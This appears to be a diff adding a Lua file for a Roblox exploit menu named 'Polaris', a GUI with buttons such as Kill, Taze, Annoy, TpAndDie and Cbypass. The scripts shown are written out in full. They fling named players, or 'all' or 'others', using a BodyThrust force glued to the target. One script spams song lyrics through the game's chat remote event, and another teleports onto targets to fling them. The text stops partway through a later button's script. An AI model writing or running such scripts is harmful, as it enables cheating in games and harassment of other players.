@@ -1,0 +1,1068 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Polaris = Instance.new("ScreenGui")
+local Polaris_2 = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Target = Instance.new("TextBox")
+local KillButton = Instance.new("TextButton")
+local FlingButton = Instance.new("TextButton")
+local GotoButton = Instance.new("TextButton")
+local AnnoyButton = Instance.new("TextButton")
+local CarpetButton = Instance.new("TextButton")
+local ShoulderButton = Instance.new("TextButton")
+local OpenCloseLocal1 = Instance.new("TextButton")
+local OpenCloseLocal2 = Instance.new("TextButton")
+local LocalScriptPage = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local FlyButton = Instance.new("TextButton")
+local ClickTpButton = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local CbypassButton = Instance.new("TextButton")
+local telekinesisButton = Instance.new("TextButton")
+local BlackHoleButton = Instance.new("TextButton")
+local AdminButton = Instance.new("TextButton")
+local PartButton = Instance.new("TextButton")
+local UnanchorButton = Instance.new("TextButton")
+local ResetButton = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local OpenSpectate = Instance.new("ImageButton")
+local TextLabel_4 = Instance.new("TextLabel")
+local Frame = Instance.new("ImageLabel")
+local Left = Instance.new("TextButton")
+local Right = Instance.new("TextButton")
+local PlrName = Instance.new("TextLabel")
+local StopButton = Instance.new("TextButton")
+local UnspeacFrame = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local TextLabel_5 = Instance.new("TextLabel")
+local speacFrame = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local TextLabel_6 = Instance.new("TextLabel")
+
+--Properties:
+
+Polaris.Name = "Polaris"
+Polaris.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Polaris.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Polaris_2.Name = "Polaris"
+Polaris_2.Parent = Polaris
+Polaris_2.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+Polaris_2.Position = UDim2.new(-0.000236138701, 0, 0.386502326, 0)
+Polaris_2.Size = UDim2.new(0, 316, 0, 357)
+
+UICorner.Parent = Polaris_2
+
+Target.Name = "Target"
+Target.Parent = Polaris_2
+Target.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+Target.Position = UDim2.new(0.181004435, 0, 0.0307535604, 0)
+Target.Size = UDim2.new(0, 200, 0, 50)
+Target.Font = Enum.Font.SourceSans
+Target.PlaceholderColor3 = Color3.fromRGB(0, 85, 255)
+Target.PlaceholderText = "Username"
+Target.Text = ""
+Target.TextColor3 = Color3.fromRGB(0, 85, 255)
+Target.TextSize = 25.000
+Target.TextWrapped = true
+
+KillButton.Name = "KillButton"
+KillButton.Parent = Polaris_2
+KillButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+KillButton.Position = UDim2.new(0.0357142873, 0, 0.196078435, 0)
+KillButton.Size = UDim2.new(0, 141, 0, 50)
+KillButton.Font = Enum.Font.SourceSans
+KillButton.Text = "Kill"
+KillButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+KillButton.TextSize = 30.000
+
+FlingButton.Name = "FlingButton"
+FlingButton.Parent = Polaris_2
+FlingButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+FlingButton.Position = UDim2.new(0.519562662, 0, 0.196078435, 0)
+FlingButton.Size = UDim2.new(0, 141, 0, 50)
+FlingButton.Font = Enum.Font.SourceSans
+FlingButton.Text = "Taze"
+FlingButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+FlingButton.TextSize = 30.000
+
+GotoButton.Name = "GotoButton"
+GotoButton.Parent = Polaris_2
+GotoButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+GotoButton.Position = UDim2.new(0.522727251, 0, 0.389355749, 0)
+GotoButton.Size = UDim2.new(0, 141, 0, 50)
+GotoButton.Font = Enum.Font.SourceSans
+GotoButton.Text = "Goto"
+GotoButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+GotoButton.TextSize = 30.000
+
+AnnoyButton.Name = "AnnoyButton"
+AnnoyButton.Parent = Polaris_2
+AnnoyButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+AnnoyButton.Position = UDim2.new(0.0353854895, 0, 0.389355749, 0)
+AnnoyButton.Size = UDim2.new(0, 141, 0, 50)
+AnnoyButton.Font = Enum.Font.SourceSans
+AnnoyButton.Text = "Annoy"
+AnnoyButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+AnnoyButton.TextSize = 30.000
+
+CarpetButton.Name = "CarpetButton"
+CarpetButton.Parent = Polaris_2
+CarpetButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+CarpetButton.Position = UDim2.new(0.0353854895, 0, 0.571428597, 0)
+CarpetButton.Size = UDim2.new(0, 141, 0, 50)
+CarpetButton.Font = Enum.Font.SourceSans
+CarpetButton.Text = "TpAndDie"
+CarpetButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+CarpetButton.TextSize = 30.000
+
+ShoulderButton.Name = "ShoulderButton"
+ShoulderButton.Parent = Polaris_2
+ShoulderButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+ShoulderButton.Position = UDim2.new(0.522727251, 0, 0.571428597, 0)
+ShoulderButton.Size = UDim2.new(0, 141, 0, 50)
+ShoulderButton.Font = Enum.Font.SourceSans
+ShoulderButton.Text = "Shoulder"
+ShoulderButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+ShoulderButton.TextSize = 30.000
+
+OpenCloseLocal1.Name = "OpenCloseLocal1"
+OpenCloseLocal1.Parent = Polaris_2
+OpenCloseLocal1.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+OpenCloseLocal1.BorderColor3 = Color3.fromRGB(27, 42, 53)
+OpenCloseLocal1.Position = UDim2.new(0.845387936, 0, 0.0287172198, 0)
+OpenCloseLocal1.Size = UDim2.new(0, 39, 0, 50)
+OpenCloseLocal1.Font = Enum.Font.SourceSans
+OpenCloseLocal1.Text = ">"
+OpenCloseLocal1.TextColor3 = Color3.fromRGB(0, 85, 255)
+OpenCloseLocal1.TextScaled = true
+OpenCloseLocal1.TextSize = 14.000
+OpenCloseLocal1.TextWrapped = true
+
+OpenCloseLocal2.Name = "OpenCloseLocal2"
+OpenCloseLocal2.Parent = Polaris_2
+OpenCloseLocal2.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+OpenCloseLocal2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+OpenCloseLocal2.Position = UDim2.new(0.845387936, 0, 0.0287172198, 0)
+OpenCloseLocal2.Size = UDim2.new(0, 39, 0, 50)
+OpenCloseLocal2.Visible = false
+OpenCloseLocal2.Font = Enum.Font.SourceSans
+OpenCloseLocal2.Text = "<"
+OpenCloseLocal2.TextColor3 = Color3.fromRGB(0, 85, 255)
+OpenCloseLocal2.TextScaled = true
+OpenCloseLocal2.TextSize = 14.000
+OpenCloseLocal2.TextWrapped = true
+
+LocalScriptPage.Name = "LocalScriptPage"
+LocalScriptPage.Parent = Polaris_2
+LocalScriptPage.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+LocalScriptPage.Position = UDim2.new(0.998694241, 0, -0.00165501237, 0)
+LocalScriptPage.Size = UDim2.new(0, 293, 0, 270)
+LocalScriptPage.Visible = false
+
+UICorner_2.Parent = LocalScriptPage
+
+FlyButton.Name = "FlyButton"
+FlyButton.Parent = LocalScriptPage
+FlyButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+FlyButton.Position = UDim2.new(0.0386822298, 0, 0.0392215289, 0)
+FlyButton.Size = UDim2.new(0, 129, 0, 50)
+FlyButton.Font = Enum.Font.SourceSans
+FlyButton.Text = "Fly"
+FlyButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+FlyButton.TextSize = 30.000
+
+ClickTpButton.Name = "ClickTpButton"
+ClickTpButton.Parent = LocalScriptPage
+ClickTpButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+ClickTpButton.Position = UDim2.new(0.0386822298, 0, 0.261443764, 0)
+ClickTpButton.Size = UDim2.new(0, 129, 0, 50)
+ClickTpButton.Font = Enum.Font.SourceSans
+ClickTpButton.Text = "ClickTp"
+ClickTpButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+ClickTpButton.TextSize = 30.000
+
+TextLabel.Parent = LocalScriptPage
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.156996593, 0, 0.855555534, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Coming soon..."
+TextLabel.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel.TextSize = 14.000
+
+CbypassButton.Name = "CbypassButton"
+CbypassButton.Parent = LocalScriptPage
+CbypassButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+CbypassButton.Position = UDim2.new(0.53356272, 0, 0.0392215401, 0)
+CbypassButton.Size = UDim2.new(0, 124, 0, 50)
+CbypassButton.Font = Enum.Font.SourceSans
+CbypassButton.Text = "Cbypass"
+CbypassButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+CbypassButton.TextSize = 30.000
+
+telekinesisButton.Name = "telekinesisButton"
+telekinesisButton.Parent = LocalScriptPage
+telekinesisButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+telekinesisButton.Position = UDim2.new(0.53356272, 0, 0.261443764, 0)
+telekinesisButton.Size = UDim2.new(0, 124, 0, 50)
+telekinesisButton.Font = Enum.Font.SourceSans
+telekinesisButton.Text = "Telekinesis"
+telekinesisButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+telekinesisButton.TextSize = 30.000
+
+BlackHoleButton.Name = "BlackHoleButton"
+BlackHoleButton.Parent = LocalScriptPage
+BlackHoleButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+BlackHoleButton.Position = UDim2.new(0.0386822298, 0, 0.476258636, 0)
+BlackHoleButton.Size = UDim2.new(0, 129, 0, 50)
+BlackHoleButton.Font = Enum.Font.SourceSans
+BlackHoleButton.Text = "BlackHole"
+BlackHoleButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+BlackHoleButton.TextSize = 30.000
+
+AdminButton.Name = "AdminButton"
+AdminButton.Parent = LocalScriptPage
+AdminButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+AdminButton.Position = UDim2.new(0.53356272, 0, 0.476258576, 0)
+AdminButton.Size = UDim2.new(0, 124, 0, 50)
+AdminButton.Font = Enum.Font.SourceSans
+AdminButton.Text = "Admin"
+AdminButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+AdminButton.TextSize = 30.000
+
+PartButton.Name = "PartButton"
+PartButton.Parent = LocalScriptPage
+PartButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+PartButton.Position = UDim2.new(0.0455081649, 0, 0.702184498, 0)
+PartButton.Size = UDim2.new(0, 127, 0, 50)
+PartButton.Font = Enum.Font.SourceSans
+PartButton.Text = "H to P"
+PartButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+PartButton.TextSize = 30.000
+
+UnanchorButton.Name = "UnanchorButton"
+UnanchorButton.Parent = LocalScriptPage
+UnanchorButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+UnanchorButton.Position = UDim2.new(0.53356272, 0, 0.702184498, 0)
+UnanchorButton.Size = UDim2.new(0, 124, 0, 50)
+UnanchorButton.Font = Enum.Font.SourceSans
+UnanchorButton.Text = "Unanchor"
+UnanchorButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+UnanchorButton.TextSize = 30.000
+
+ResetButton.Name = "ResetButton"
+ResetButton.Parent = Polaris_2
+ResetButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+ResetButton.Position = UDim2.new(0.522727251, 0, 0.753501415, 0)
+ResetButton.Size = UDim2.new(0, 141, 0, 50)
+ResetButton.Font = Enum.Font.SourceSans
+ResetButton.Text = "Reset"
+ResetButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+ResetButton.TextSize = 30.000
+
+TextLabel_2.Parent = Polaris_2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.183544278, 0, 0.859943986, 0)
+TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Made by Polaris#2680 / Unlversal_cha0s"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel_2.TextSize = 14.000
+
+TextLabel_3.Parent = Polaris_2
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.183544278, 0, 0.893557429, 0)
+TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Polaris gui"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel_3.TextSize = 14.000
+
+OpenSpectate.Name = "OpenSpectate"
+OpenSpectate.Parent = Polaris_2
+OpenSpectate.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+OpenSpectate.Position = UDim2.new(0.0322433412, 0, 0.0307535976, 0)
+OpenSpectate.Size = UDim2.new(0.124065734, 0, 0.138631016, 0)
+
+TextLabel_4.Parent = OpenSpectate
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(0.0207148846, 0, 0.00974483415, 0)
+TextLabel_4.Size = UDim2.new(0, 37, 0, 46)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = "V"
+TextLabel_4.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 14.000
+TextLabel_4.TextWrapped = true
+
+Frame.Name = "Frame"
+Frame.Parent = Polaris_2
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 1.000
+Frame.Position = UDim2.new(0.499770641, 0, -0.0497486964, 0)
+Frame.Size = UDim2.new(1.00045872, 0, 0.0953309834, 0)
+Frame.Visible = false
+Frame.Image = "rbxassetid://3570695787"
+Frame.ImageColor3 = Color3.fromRGB(52, 52, 52)
+Frame.ScaleType = Enum.ScaleType.Slice
+Frame.SliceCenter = Rect.new(100, 100, 100, 100)
+Frame.SliceScale = 0.120
+
+Left.Name = "Left"
+Left.Parent = Frame
+Left.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Left.BackgroundTransparency = 1.000
+Left.BorderSizePixel = 0
+Left.Position = UDim2.new(-0.0040650405, 0, 0.0119827539, 0)
+Left.Size = UDim2.new(0.300000012, 0, 1, 0)
+Left.Font = Enum.Font.SourceSans
+Left.Text = "<"
+Left.TextColor3 = Color3.fromRGB(0, 85, 255)
+Left.TextScaled = true
+Left.TextSize = 14.000
+Left.TextWrapped = true
+
+Right.Name = "Right"
+Right.Parent = Frame
+Right.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Right.BackgroundTransparency = 1.000
+Right.BorderSizePixel = 0
+Right.Position = UDim2.new(0.696836889, 0, 0.011982752, 0)
+Right.Size = UDim2.new(0.300000012, 0, 1, 0)
+Right.Font = Enum.Font.SourceSans
+Right.Text = ">"
+Right.TextColor3 = Color3.fromRGB(0, 85, 255)
+Right.TextScaled = true
+Right.TextSize = 14.000
+Right.TextWrapped = true
+
+PlrName.Name = "PlrName"
+PlrName.Parent = Frame
+PlrName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlrName.BackgroundTransparency = 1.000
+PlrName.BorderSizePixel = 0
+PlrName.Position = UDim2.new(0.300000012, 0, 0, 0)
+PlrName.Size = UDim2.new(0.400000006, 0, 1, 0)
+PlrName.Font = Enum.Font.SourceSans
+PlrName.Text = "PlayerName"
+PlrName.TextColor3 = Color3.fromRGB(0, 85, 255)
+PlrName.TextScaled = true
+PlrName.TextSize = 14.000
+PlrName.TextWrapped = true
+
+StopButton.Name = "StopButton"
+StopButton.Parent = Polaris_2
+StopButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+StopButton.Position = UDim2.new(0.0353854895, 0, 0.753501415, 0)
+StopButton.Size = UDim2.new(0, 141, 0, 50)
+StopButton.Font = Enum.Font.SourceSans
+StopButton.Text = "Stop"
+StopButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+StopButton.TextSize = 30.000
+
+UnspeacFrame.Name = "UnspeacFrame"
+UnspeacFrame.Parent = Polaris_2
+UnspeacFrame.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+UnspeacFrame.Position = UDim2.new(0, 0, -0.0868347362, 0)
+UnspeacFrame.Size = UDim2.new(0, 316, 0, 25)
+
+UICorner_3.Parent = UnspeacFrame
+
+TextLabel_5.Parent = UnspeacFrame
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.BorderSizePixel = 3
+TextLabel_5.Size = UDim2.new(0, 316, 0, 25)
+TextLabel_5.Font = Enum.Font.SourceSans
+TextLabel_5.Text = "Polaris V.1"
+TextLabel_5.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 14.000
+TextLabel_5.TextWrapped = true
+
+speacFrame.Name = "speacFrame"
+speacFrame.Parent = Polaris_2
+speacFrame.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+speacFrame.Position = UDim2.new(0, 0, -0.184873968, 0)
+speacFrame.Size = UDim2.new(0, 316, 0, 25)
+speacFrame.Visible = false
+
+UICorner_4.Parent = speacFrame
+
+TextLabel_6.Parent = speacFrame
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.BorderSizePixel = 3
+TextLabel_6.Position = UDim2.new(-0.00316455704, 0, 0, 0)
+TextLabel_6.Size = UDim2.new(0, 316, 0, 25)
+TextLabel_6.Font = Enum.Font.SourceSans
+TextLabel_6.Text = "Polaris V.1"
+TextLabel_6.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel_6.TextScaled = true
+TextLabel_6.TextSize = 14.000
+TextLabel_6.TextWrapped = true
+
+-- Scripts:
+
+local function PMTN_fake_script() -- KillButton.LocalScript 
+	local script = Instance.new('LocalScript', KillButton)
+
+	local lplayer = game:GetService('Players').LocalPlayer
+	local Target = script.Parent.Parent.Target
+	local kill = false
+	function GetPlayer(String)
+		local Found = {}
+		local strl = String:lower()
+		if strl == "all" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				table.insert(Found,v)
+			end
+		elseif strl == "others" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name ~= lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		elseif strl == "me" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name == lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		else
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name:lower():sub(1, #String) == String:lower() then
+					table.insert(Found,v)
+				end
+			end 
+		end
+		return Found 
+	end
+	
+	script.Parent.Parent.ResetButton.MouseButton1Click:Connect(function()
+		kill = false
+	end)
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local target = unpack(GetPlayer(Target.Text)).Character
+	
+		lplayer.Character.Humanoid.PlatformStand = true
+		kill = true
+		local coin = Instance.new('BodyThrust',lplayer.Character.HumanoidRootPart)
+		coin.Force = Vector3.new(18000,18000,18000)
+		coin.Name = "yeetforce"
+		repeat lplayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position game:GetService('RunService').Heartbeat:wait() until not target.Head or kill == false
+	end)
+end
+coroutine.wrap(PMTN_fake_script)()
+local function KKXTZ_fake_script() -- FlingButton.LocalScript 
+	local script = Instance.new('LocalScript', FlingButton)
+
+	local lplayer = game:GetService('Players').LocalPlayer
+	local Target = script.Parent.Parent.Target
+	local kill = false
+	function GetPlayer(String)
+		local Found = {}
+		local strl = String:lower()
+		if strl == "all" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				table.insert(Found,v)
+			end
+		elseif strl == "others" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name ~= lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		elseif strl == "me" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name == lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		else
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name:lower():sub(1, #String) == String:lower() then
+					table.insert(Found,v)
+				end
+			end 
+		end
+		return Found 
+	end
+	
+	script.Parent.Parent.ResetButton.MouseButton1Click:Connect(function()
+		kill = false
+	end)
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local target = unpack(GetPlayer(Target.Text)).Character
+	
+		lplayer.Character.Humanoid.PlatformStand = true
+		kill = true
+		local coin = Instance.new('BodyThrust',lplayer.Character.HumanoidRootPart)
+		coin.Force = Vector3.new(50,50,50)
+		coin.Name = "yeetforce"
+		repeat lplayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position game:GetService('RunService').Heartbeat:wait() until not target.Head or kill == false
+	end)
+end
+coroutine.wrap(KKXTZ_fake_script)()
+local function ATNA_fake_script() -- GotoButton.LocalScript 
+	local script = Instance.new('LocalScript', GotoButton)
+
+	local lplayer = game:GetService('Players').LocalPlayer
+	local Target = script.Parent.Parent.Target
+	function GetPlayer(String)
+		local Found = {}
+		local strl = String:lower()
+		if strl == "all" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				table.insert(Found,v)
+			end
+		elseif strl == "others" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name ~= lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		elseif strl == "me" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name == lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		else
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name:lower():sub(1, #String) == String:lower() then
+					table.insert(Found,v)
+				end
+			end 
+		end
+		return Found 
+	end
+	
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local target = unpack(GetPlayer(Target.Text)).Character
+	
+		
+		local coin = Instance.new('BodyThrust',lplayer.Character.HumanoidRootPart)
+	    lplayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position
+	end)
+end
+coroutine.wrap(ATNA_fake_script)()
+local function FIHFKRH_fake_script() -- AnnoyButton.LocalScript 
+	local script = Instance.new('LocalScript', AnnoyButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local A_1 = "We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "You know the rules and so do I" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "A full commitment's what I'm thinking of" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "You wouldn't get this from any other guy" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "I just wanna tell you how I'm feeling" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "(Give you up) (Ooh) Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+		local A_1 = "Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye" local A_2 = "All" 
+		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		wait(2)
+	end)
+	
+end
+coroutine.wrap(FIHFKRH_fake_script)()
+local function JJCIHKB_fake_script() -- AnnoyButton.LocalScript 
+	local script = Instance.new('LocalScript', AnnoyButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local LocalPlayer = Players.LocalPlayer
+		local function RemoveSpaces(String)
+			return String:gsub("%s+", "") or String
+		end
+	
+		local function FindPlayer(String)
+			String = RemoveSpaces(String)
+			for _, _Player in pairs(Players:GetPlayers()) do
+				if _Player.Name:lower():match('^'.. String:lower()) then
+					return _Player
+				end
+			end
+			return nil
+		end
+	
+		local target = script.Parent.Parent.Target
+	
+		script.Parent.MouseButton1Click:Connect(function()
+			local Target = FindPlayer(target.Text)
+			if Target and Target.Character then
+				local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+				local Torso = Character:FindFirstChild("Torso") or Character:FindFirstChild("UpperTorso")
+	
+				local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
+				Torso.Anchored = true
+				local tool = Instance.new("Tool", LocalPlayer.Backpack)
+				local hat = LocalPlayer.Character:FindFirstChildOfClass("Accessory")
+				local hathandle = hat.Handle
+				hathandle.Parent = tool
+				hathandle.Massless = true
+				tool.GripPos = Vector3.new(0, 9e99, 0)
+				tool.Parent = LocalPlayer.Character
+				repeat wait() until LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= nil
+				tool.Grip = CFrame.new(Vector3.new(0, 0, 0))
+				Torso.Anchored = false
+				repeat LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = Target.Character:FindFirstChild("HumanoidRootPart").CFrame wait()
+				until Target.Character == nil or Target.Character:FindFirstChild("Humanoid").Health <= 0 or LocalPlayer.Character == nil or LocalPlayer.Character:FindFirstChild("Humanoid").Health <= 0 or (Target.Character:FindFirstChild("HumanoidRootPart").Velocity.magnitude - Target.Character:FindFirstChild("Humanoid").WalkSpeed) > (Target.Character:FindFirstChild("Humanoid").WalkSpeed + 20)
+				LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
+				hathandle.Parent = hat
+				hathandle.Massless = false
+				tool:Destroy()
+				LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
+			else
+				warn'no player found named like that or he has no char'
+			end
+		end)
+	
+	end)
+	
+end
+coroutine.wrap(JJCIHKB_fake_script)()
+local function HIKC_fake_script() -- CarpetButton.LocalScript 
+	local script = Instance.new('LocalScript', CarpetButton)
+
+	local lplayer = game:GetService('Players').LocalPlayer
+	local Target = script.Parent.Parent.Target
+	local kill = false
+	function GetPlayer(String)
+		local Found = {}
+		local strl = String:lower()
+		if strl == "all" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				table.insert(Found,v)
+			end
+		elseif strl == "others" then
